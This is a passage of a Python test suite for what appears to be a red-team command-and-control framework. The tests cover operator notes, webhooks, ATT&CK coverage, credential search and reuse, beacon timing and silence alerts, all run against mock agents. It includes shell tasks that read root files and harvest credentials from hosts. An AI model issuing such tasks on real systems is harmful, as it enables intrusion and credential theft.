    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    note_go = read_text("server/internal/note/note.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")

    # The ledger is a package of its own, with a lock and a file.
    assert "package note" in note_go, "there is no ledger of the notes"
    assert "func (r *Registry) Add(" in note_go
    assert "func (r *Registry) List(" in note_go
    assert "func (r *Registry) Save(" in note_go
    assert "0o600" in note_go, "the ledger is not written for the owner only"

    # The server answers the four commands of the notes.
    for command in ("note.add", "note.list", "note.remove", "note.show"):
        assert f'case "{command}"' in operator, f"the server has no {command}"
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    # Reading the notes is a viewer; writing and taking away are the
    # work of the operator.
    assert re.search(r'"note.add":\s+Operator,', rbac)
    assert re.search(r'"note.list":\s+Viewer,', rbac)
    assert re.search(r'"note.remove":\s+Operator,', rbac)
    assert re.search(r'"note.show":\s+Viewer,', rbac)

    # And the console has a command for it.
    assert "run_note" in cli_src
    assert 'sub.add_parser("note"' in cli_src

    token = b"note-token-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    alice = OperatorClient(server.address, token.decode(), "alice")
    try:
        alice.connect()

        # A note is not written without the host it is about.
        with pytest.raises(Exception):
            alice.note_add("", "a note without a host")
        # Nor without the line of words.
        with pytest.raises(Exception):
            alice.note_add("web-01", "  ")

        # The first note is written.
        written = alice.note_add("web-01", "fileserver of the bridge subnet")
        assert written.get("id"), written
        assert written.get("agent_id") == "web-01", written
        assert written.get("author") == "alice", written

        # The dossier of the host carries the note.
        listed = alice.note_list(agent_id="web-01")
        assert listed["count"] == 1, listed
        assert listed["notes"][0]["agent_id"] == "web-01", listed
        assert listed["notes"][0]["text"] == "fileserver of the bridge subnet", listed
        assert listed["notes"][0]["author"] == "alice", listed

        # One note by itself, with the hand that wrote it.
        one = alice.note_show(written["id"])
        assert one.get("id") == written["id"], one
        assert one.get("text") == "fileserver of the bridge subnet", one
        assert one.get("author") == "alice", one

        # The note of one host is not the note of another.
        assert alice.note_list(agent_id="sql-01")["count"] == 0

        # The note can be taken away, and the ledger says so.
        removed = alice.note_remove(written["id"])
        assert removed.get("removed") is True, removed
        assert alice.note_list(agent_id="web-01")["count"] == 0
    finally:
        alice.close()
        server.stop()


def test_the_console_reaches_the_notes():
    """The console has a command for the notes.

    A command nobody can type is a command that does not exist, so the
    parser knows the add, the list, the show and the remove.
    """
    from umbra_cli import cli  # noqa: WPS433

    parser = cli.build_parser()

    args = parser.parse_args(["note", "list"])
    assert args.cmd == "note" and args.note_cmd == "list"
    args = parser.parse_args(["note", "add", "--agent", "web-01", "the web server"])
    assert args.note_cmd == "add" and args.agent == "web-01"
    assert args.text == "the web server"
    args = parser.parse_args(["note", "show", "n-0001"])
    assert args.note_cmd == "show" and args.id == "n-0001"
    args = parser.parse_args(["note", "remove", "n-0001"])
    assert args.note_cmd == "remove" and args.id == "n-0001"


def test_the_wires_carry_the_events_to_the_place_the_team_chose():
    """The wires to the outside world: the webhooks of the team.

    A console watches the events by staying connected; the team that
    wants the news somewhere else writes down a URL, and the server
    posts every event that matches to it, signed with the word of the
    wire.  The delivery book says how every post went, and the secret
    never leaves the ledger.
    """
    import http.server
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer, FakeAgent  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    hook_go = read_text("server/internal/hook/hook.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    hub_go = read_text("server/internal/hub/hub.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    protocol = read_text("docs/PROTOCOL.md")

    # The ledger is a package of its own, with a lock and a file.
    assert "package hook" in hook_go, "there is no ledger of the wires"
    assert "func (r *Registry) Add(" in hook_go
    assert "func (r *Registry) Dispatch(" in hook_go
    assert "func (r *Registry) Test(" in hook_go
    assert "0o600" in hook_go, "the ledger is not written for the owner only"
    assert "X-Umbra-Signature" in hook_go, "the posts are not signed"

    # The hub hands every event to the wire, after the consoles and the
    # alert rules.
    assert "func (h *Hub) AddTap(" in hub_go, "the hub has no tap"
    assert "tap(ev)" in hub_go, "the tap is never called"

    # The server answers the four commands of the wires.
    for command in ("hook.add", "hook.list", "hook.remove", "hook.test"):
        assert re.search(rf'case [^:\n]*"{command}"', operator), (
            f"the server has no {command}")
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")
        assert f"`{command}`" in protocol

    # Writing a wire down and ringing it are the work of the operator;
    # reading the ledger is a read.
    assert re.search(r'"hook.add":\s+Operator,', rbac)
    assert re.search(r'"hook.list":\s+Viewer,', rbac)
    assert re.search(r'"hook.remove":\s+Operator,', rbac)
    assert re.search(r'"hook.test":\s+Operator,', rbac)

    posts = []
    posts_lock = threading.Lock()

    class Listener(http.server.BaseHTTPRequestHandler):
        """The place the team chose: it keeps what it was told."""

        def do_POST(self):  # noqa: N802 - the library names the method
            body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
            with posts_lock:
                posts.append({"path": self.path,
                              "event": self.headers.get("X-Umbra-Event"),
                              "signature": self.headers.get(
                                  "X-Umbra-Signature"),
                              "body": body})
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):  # keep the test output quiet
            pass

    site = http.server.HTTPServer(("127.0.0.1", 0), Listener)
    site_thread = threading.Thread(target=site.serve_forever, daemon=True)
    site_thread.start()
    url = f"http://127.0.0.1:{site.server_address[1]}/news"

    token = b"wire-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-wires", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")

        # A wire that is not an address is refused.
        with pytest.raises(Exception):
            client.hook_add("ftp://example.org/x")

        # The wire is written down: it carries the results of the tasks,
        # and its posts are signed.
        written = client.hook_add(url, kinds=["task.result"], secret="pw123")
        assert written.get("id", "").startswith("h-"), written

        # The work of the day produces an event the wire carries.
        task_id = client.submit("agent-wires", "shell",
                                {"cmd": "echo down-the-wire"})
        assert wait_until(
            lambda: client.task(task_id).get("state") in ("done", "failed"),
            timeout=15), "the task never came back"
        assert wait_until(
            lambda: any(p["event"] == "task.result" for p in posts),

            timeout=10), "the wire carried nothing"

        with posts_lock:
            post = next(p for p in posts if p["event"] == "task.result")
        body = json.loads(post["body"])
        assert body["kind"] == "task.result", body
        assert body["task_id"] == task_id, body
        assert body["agent_id"] == "agent-wires", body
        want = "sha256=" + hmac.new(b"pw123", post["body"],
                                    hashlib.sha256).hexdigest()
        assert post["signature"] == want, "the post is not signed with the word of the wire"

        # The delivery book says how the post went.
        assert wait_until(lambda: (
            (client.hook_list().get("hooks") or [{}])[0].get("last", {})
            .get("status") == 200), timeout=10), "the book stayed empty"
        listed = client.hook_list()
        assert listed["count"] == 1, listed
        row = listed["hooks"][0]
        assert "secret" not in row, "the list leaked the word of the wire"
        assert row["last"]["kind"] == "task.result", row

        # An event the wire does not carry stays at home.
        before = len(posts)
        server.emit("agent.heartbeat", "agent-wires")
        time.sleep(0.5)  # widen the window on purpose: a post that must NOT arrive can only be proven by waiting
        assert len(posts) == before, "the wire carried what it did not ask for"

        # The wire can be rung once, marked as a test, so nobody is paged.
        rung = client.hook_test(written["id"])
        assert rung.get("status") == 200, rung
        assert wait_until(lambda: any(
            p["event"] == "hook.test" for p in posts), timeout=10)
        with posts_lock:
            probe = next(p for p in reversed(posts)
                         if p["event"] == "hook.test")
        assert json.loads(probe["body"]).get("test") is True

        # The wire can be forgotten; the posts it made stay made.
        removed = client.hook_remove(written["id"])
        assert removed.get("removed") is True, removed
        assert client.hook_list()["count"] == 0
    finally:
        client.close()
        agent.stop()
        server.stop()
        site.shutdown()


def test_the_wall_of_techniques_counts_the_work_of_the_team():
    """The wall of the ATT&CK techniques the team uses.

    The catalogue of the trade is the common tongue: the wall lies the
    task kinds next to the techniques they belong to and counts the
    finished work of the team — which techniques were used, on which
    hosts, and when last.  A zero is a door the team has not tried.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer, FakeAgent, ATTACK_TABLE  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    attack_go = read_text("server/internal/attack/attack.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    protocol = read_text("docs/PROTOCOL.md")

    # The wall is a package of its own, and it is a statement: a table,
    # a coverage walk, and the list of what nobody mapped.
    assert "package attack" in attack_go, "there is no wall"
    assert "var Table = []Technique" in attack_go
    assert "func Coverage(" in attack_go
    assert "func Unmapped(" in attack_go
    for technique in ("T1059", "T1083", "T1005", "T1090"):
        assert technique in attack_go, f"the wall does not know {technique}"

    assert re.search(r'case [^:\n]*"attack.coverage"', operator)
    assert re.search(r'"attack.coverage":\s+Viewer,', rbac)
    assert 'self.rpc("attack.coverage"' in client_src
    assert "`attack.coverage`" in protocol
    assert "function attack" in read_text("server/internal/dash/index.html") \
        or "attack.coverage" in read_text("server/internal/dash/index.html"), (
        "the dashboard does not show the wall")

    token = b"wall-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-wall", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10)

        # Two pieces of work: the interpreter and the discovery.
        first = client.submit("agent-wall", "shell", {"cmd": "echo wall"})
        second = client.submit("agent-wall", "find", {"path": ".", "name": "umbra"})
        for task_id in (first, second):
            assert wait_until(
                lambda tid=task_id: client.task(tid).get("state")
                in ("done", "failed"), timeout=15), f"{task_id} never back"
            assert client.task(task_id)["state"] == "done"

        wall = client.attack_coverage()
        assert wall["total"] == len(ATTACK_TABLE), (
            "the mock and the wall disagree about the catalogue")
        assert wall["covered"] >= 2, wall
        by_id = {row["id"]: row for row in wall["techniques"]}
        assert by_id["T1059"]["tasks"] >= 1, by_id["T1059"]
        assert "agent-wall" in by_id["T1059"].get("agents", []), by_id["T1059"]
        assert by_id["T1059"].get("last"), by_id["T1059"]
        assert by_id["T1083"]["tasks"] >= 1, by_id["T1083"]
        # A door the team has not tried is a zero, and it is said so.
        assert by_id["T1123"]["tasks"] == 0, by_id["T1123"]
        assert not by_id["T1123"].get("agents"), by_id["T1123"]
        assert wall["unmapped"] == [], wall

        # The wall can be read for one host, and an unknown host has
        # never tried a door.
        one = client.attack_coverage(agent_id="agent-wall")
        assert one["covered"] >= 2, one
        none = client.attack_coverage(agent_id="no-such-host")
        assert none["covered"] == 0, none
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_search_box_digs_through_the_records():
    """The digging box: one needle through the tasks, notes and creds.

    The records of an engagement accrete faster than anybody reads
    them.  The box takes the needle and answers with the books that
    carry it and the piece of the text around each hit.  A needle of
    small letters matches any casing; a capital means what it says.
    The secret of a credential is never searched and never shown.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer, FakeAgent  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    search_go = read_text("server/internal/search/search.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    protocol = read_text("docs/PROTOCOL.md")

    assert "package search" in search_go, "there is no digging box"
    assert "func Tasks(" in search_go
    assert "func Notes(" in search_go
    assert "func Creds(" in search_go
    assert "func Fold(" in search_go, "the box is not polite about casing"
    assert "looksText" in search_go, "the box would dig through pictures"
    assert re.search(r'case [^:\n]*"search.query"', operator)
    assert re.search(r'"search.query":\s+Viewer,', rbac)
    assert 'self.rpc("search.query"' in client_src
    assert "run_search" in cli_src
    assert "`search.query`" in protocol

    token = b"dig-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-dig", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10)

        # A word in the output of a task, in a note, and in the words of
        # a queued one.  The output carries the needle while the words
        # of the command carry only its base64 shadow, so the hit names
        # the output and not the arguments.
        shadow = base64.b64encode(b"TANGO-NEEDLE-9182").decode()
        task_id = client.submit("agent-dig", "shell",
                                {"cmd": f"echo {shadow} | base64 -d"})
        wait_until(lambda: client.task(task_id).get("state") == "done",
                   timeout=15)
        client.note_add("agent-dig", "the host hummed tango-needle-9182 all day")
        queued = client.submit("agent-dig", "shell",
                               {"cmd": "cat /root/tango-plan-5542.txt"})

        # Small letters match any casing; each hit says where it was.
        found = client.search_query("tango-needle-9182")
        assert found["count"] >= 2, found
        task_hits = found["tasks"]
        assert any(hit.get("task_id") == task_id and hit["field"] == "output"
                   for hit in task_hits), task_hits
        piece = next(hit["snippet"] for hit in task_hits
                     if hit.get("task_id") == task_id)
        assert "TANGO-NEEDLE-9182" in piece, piece
        assert client.search_query("tango-needle-9182", scope="notes")[
            "notes"], "the note stayed hidden"

        # The words of a queued task are found, even before it runs.
        planned = client.search_query("tango-plan-5542", scope="tasks")
        assert any(hit.get("task_id") == queued and hit["field"] == "args"
                   for hit in planned["tasks"]), planned

        # A capital in the needle means what it says.
        exact = client.search_query("TANGO-needle", scope="tasks")
        assert not exact.get("tasks"), exact

        # The secrets that came home can be found, without the search
        # ever touching the secret itself.
        creds_task = client.submit("agent-dig", "creds", {"raw": True})
        assert wait_until(
            lambda: client.task(creds_task).get("state") == "done",
            timeout=15)
        rows = client.creds_list()
        assert rows, "the vault stayed empty"
        word = rows[0].get("account") or rows[0].get("target")
        assert word, rows[0]
        digs = client.search_query(str(word), scope="creds")
        assert digs["creds"], "the vault stayed hidden"
        for hit in digs["creds"]:
            assert "secret" not in hit.get("snippet", "").lower() \
                or rows[0].get("account", "").lower() in \
                hit.get("snippet", "").lower()
        # The find of a credential names its account, its target, its
        # source, its kind or its note — never the secret itself.
        for hit in digs["creds"]:
            assert hit.get("field") in (
                "account", "target", "source", "kind", "note"), hit
        # A scope that is not one is refused, and an empty needle as well.
        with pytest.raises(Exception):
            client.search_query("tango", scope="everything")
        with pytest.raises(Exception):
            client.search_query("   ")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_reaches_the_wires_the_wall_and_the_box():
    """The console has a command for each of the three.

    A command nobody can type is a command that does not exist, so the
    parser knows the wires, the wall and the digging box.
    """
    from umbra_cli import cli  # noqa: WPS433

    cli_src = read_text("operator/umbra_cli/cli.py")
    parser = cli.build_parser()

    args = parser.parse_args(["hook", "list"])
    assert args.cmd == "hook" and args.hook_cmd == "list"
    args = parser.parse_args(["hook", "add", "https://chat.example.org/x",
                              "--kinds", "task.*,agent.online",
                              "--secret", "pw"])
    assert args.hook_cmd == "add" and args.url.endswith("/x")
    assert args.kinds == "task.*,agent.online" and args.secret == "pw"
    args = parser.parse_args(["hook", "remove", "h-0001"])
    assert args.hook_cmd == "remove" and args.id == "h-0001"
    args = parser.parse_args(["hook", "test", "h-0001"])
    assert args.hook_cmd == "test" and args.id == "h-0001"

    args = parser.parse_args(["attack", "--agent", "web-01", "--all"])
    assert args.cmd == "attack" and args.agent == "web-01" and args.all

    args = parser.parse_args(["search", "flag", "tango", "--scope", "tasks",
                              "--agent", "web-01", "--limit", "10"])
    assert args.cmd == "search" and args.words == ["flag", "tango"]
    assert args.scope == "tasks" and args.agent == "web-01" and args.limit == 10

    for runner in ("run_hook", "run_attack", "run_search"):
        assert f"def {runner}(" in cli_src, f"the console lacks {runner}"


def test_the_rhythm_says_how_a_host_breathes():
    """The rhythm of the beacons: the shape of the check-ins.

    An implant calls home on a clock somebody set; the rhythm says the
    shape of what it actually does.  A beacon that calls home like a
    metronome is a beacon a watcher can set a clock by, so the fleet
    list puts the clocks first, and a host with two check-ins is
    "young", because two check-ins are not a shape.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer, FakeAgent  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    rhythm_go = read_text("server/internal/rhythm/rhythm.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    protocol = read_text("docs/PROTOCOL.md")

    assert "package rhythm" in rhythm_go, "there is no rhythm"
    assert "func (r *Registry) Record(" in rhythm_go
    assert "func (r *Registry) Stats(" in rhythm_go
    assert "func (r *Registry) Fleet(" in rhythm_go
    assert "ev.Kind != \"agent.heartbeat\"" in rhythm_go, (
        "the rhythm counts more than the beats")

    for command in ("rhythm.get", "rhythm.fleet"):
        assert re.search(rf'case [^:\n]*"{command}"', operator), (
            f"the server has no {command}")
        assert re.search(rf'"{command}":\s+Viewer,', rbac)
        assert f'self.rpc("{command}"' in client_src
        assert f"`{command}`" in protocol
    assert "run_rhythm" in cli_src and re.search(r'sub\.add_parser\(\s*"rhythm"', cli_src)

    token = b"breath-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-breath", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10)

        # Two check-ins are not a shape yet.
        assert wait_until(lambda: client.rpc("rhythm.get", {
            "agent": "agent-breath"}).ok, timeout=10), "no beat ever arrived"
        early = client.rhythm_get("agent-breath")
        assert early["shape"] in ("young", "steady", "breathing",
                                  "a metronome", "wandering"), early
        assert early["beats"] >= 1, early

        # After a window the host has a shape and the console can read it.
        assert wait_until(lambda: client.rhythm_get(
            "agent-breath").get("beats", 0) >= 6, timeout=15), (
            "the host never breathed often enough")
        stats = client.rhythm_get("agent-breath")
        assert stats["beats"] >= 6, stats
        assert stats["interval_ms"] >= 150, stats
        assert stats["longest_ms"] >= stats["shortest_ms"] >= 0, stats
        assert "eta" in stats and "cv" in stats, stats

        # The fleet puts the hosts in order, the clocks first.
        fleet = client.rhythm_fleet()
        assert fleet["count"] >= 1, fleet
        assert any(row["agent_id"] == "agent-breath"
                   for row in fleet["fleet"]), fleet

        # A host that never called home has no shape; the answer says so.
        with pytest.raises(Exception):
            client.rhythm_get("no-such-host")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_same_key_opens_other_doors():
    """The reuse of a secret: one digest, more than one host.

    The vault keeps the digest of every material, so the same password
    on two hosts is provable as reuse without the password ever leaving
    the vault.  The answer names the first hexits of the digest, the
    hosts and the accounts — and no value.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer, FakeAgent  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    store_go = read_text("server/internal/store/store.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    protocol = read_text("docs/PROTOCOL.md")

    assert "func (s *Store) CredentialReuse(" in store_go, (
        "the vault does not count the reused keys")
    assert 'case "creds.reuse"' in operator
    assert re.search(r'"creds.reuse":\s+Viewer,', rbac)
    assert 'self.rpc("creds.reuse"' in client_src
    assert "run_creds_reuse" in cli_src
    assert re.search(r'sub\.add_parser\(\s*"creds-reuse"', cli_src)
    assert "`creds.reuse`" in protocol

    token = b"reuse-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    alpha = FakeAgent(server.address, AGENT_PSK, "agent-alpha", interval=0.2)
    beta = FakeAgent(server.address, AGENT_PSK, "agent-beta", interval=0.2)
    alpha.start()
    beta.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: len(client.agents()) >= 2, timeout=10)

        # The catalogue of the fake agents is the same on both hosts,
        # so the same secrets come home from both.
        for name in ("agent-alpha", "agent-beta"):
            task_id = client.submit(name, "creds", {"raw": True})
            assert wait_until(
                lambda tid=task_id: client.task(tid).get("state") == "done",
                timeout=15), f"{name} never answered"

        reuse = client.creds_reuse()
        assert reuse["count"] >= 1, "the reused keys stayed invisible"
        group = reuse["groups"][0]
        assert group["count"] >= 2, group
        assert len(group["hosts"]) >= 2, group
        assert len(group["digest"]) == 12, (
            "the group says more of the digest than a pointer needs")
        assert "secret" not in group and "value" not in group, group
        assert group["accounts"] and group["targets"], group

        # Before any collection the vault had nothing to say.
        fresh = client.creds_reuse()
        assert fresh["count"] == reuse["count"]
    finally:
        client.close()
        alpha.stop()
        beta.stop()
        server.stop()


def test_the_news_of_nothing_pages_the_team():
    """The watches of the silences: the news of nothing on the wires.

    The alarms of the day fire when something happens; a host that went
    quiet does nothing.  The watch turns the nothing into an
    `agent.silent` event — and a wire that carries it pages the chat
    room the team chose, which is why the wave of the wires and the
    wave of the silences were built to fit together.
    """
    import http.server
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer, FakeAgent  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    silence_go = read_text("server/internal/silence/silence.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    protocol = read_text("docs/PROTOCOL.md")

    assert "package silence" in silence_go, "there is no watch of silences"
    assert "func (r *Registry) Add(" in silence_go
    assert "func (r *Registry) Due(" in silence_go
    assert "0o600" in silence_go, "the ledger is not written for the owner only"
    for command in ("silence.add", "silence.list", "silence.remove"):
        assert re.search(rf'case [^:\n]*"{command}"', operator), (
            f"the server has no {command}")
        assert f'self.rpc("{command}"' in client_src
        assert f"`{command}`" in protocol
    assert re.search(r'"silence.add":\s+Operator,', rbac)
    assert re.search(r'"silence.list":\s+Viewer,', rbac)
    assert re.search(r'"silence.remove":\s+Operator,', rbac)
    assert "run_silence" in cli_src and re.search(r'sub\.add_parser\(\s*"silence"', cli_src)

    posts = []
    posts_lock = threading.Lock()

    class Listener(http.server.BaseHTTPRequestHandler):
        """The pager of the team."""

        def do_POST(self):  # noqa: N802 - the library names the method
            body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
            with posts_lock:
                posts.append(body and json.loads(body) or {})
            self.send_response(200)
            self.end_headers()

        def log_message(self, *args):
            pass

    site = http.server.HTTPServer(("127.0.0.1", 0), Listener)
    threading.Thread(target=site.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{site.server_address[1]}/pager"

    token = b"news-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-news", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10)

        # A wire to the pager, and a promise to worry about the host.
        client.hook_add(url, kinds=["agent.silent"])
        promised = client.silence_add("agent-news", seconds=5)
        assert promised["id"].startswith("s-"), promised
        assert promised["cooldown"] == 50, promised

        # One promise per silence: the second one is refused out loud.
        with pytest.raises(Exception):
            client.silence_add("agent-news", seconds=30)

        # While the host calls home, nothing is news.
        listed = client.silence_list()
        assert listed["count"] == 1, listed
        assert listed["watches"][0].get("quiet_for", 99) < 10, listed

        # The host stops calling home: the nothing becomes the word.
        agent.stop()
        assert wait_until(lambda: any(
            p.get("kind") == "agent.silent" for p in posts), timeout=15), (
            "the silence never paged")
        with posts_lock:
            page = next(p for p in posts if p.get("kind") == "agent.silent")
        assert page["agent_id"] == "agent-news", page
        assert page["data"]["watch"] == promised["id"], page
        assert page["data"]["quiet_for"] >= page["data"]["seconds"], page

        # The ledger of the watches says that it spoke.
        listed = client.silence_list()
        assert listed["watches"][0].get("last_fired"), listed

        removed = client.silence_remove(promised["id"])
        assert removed.get("removed") is True, removed
        assert client.silence_list()["count"] == 0
    finally:
        client.close()
        agent.stop()
        server.stop()
        site.shutdown()


def test_the_console_reaches_the_rhythm_the_reuse_and_the_silence():
    """The console has a command for each of the three."""
    from umbra_cli import cli  # noqa: WPS433

    cli_src = read_text("operator/umbra_cli/cli.py")
    parser = cli.build_parser()

    args = parser.parse_args(["rhythm"])
    assert args.cmd == "rhythm" and args.agent == ""
    args = parser.parse_args(["rhythm", "web-01"])
    assert args.agent == "web-01"
    assert "run_rhythm" in cli_src

    args = parser.parse_args(["creds-reuse"])
    assert args.cmd == "creds-reuse"
    assert "run_creds_reuse" in cli_src

    args = parser.parse_args(["silence", "list"])
    assert args.cmd == "silence" and args.silence_cmd == "list"
    args = parser.parse_args(["silence", "add", "web-01", "--seconds", "120",
                              "--cooldown", "900"])
    assert args.silence_cmd == "add" and args.agent == "web-01"
    assert args.seconds == 120 and args.cooldown == 900
    args = parser.parse_args(["silence", "remove", "s-0001"])
    assert args.silence_cmd == "remove" and args.id == "s-0001"
    assert "run_silence" in cli_src
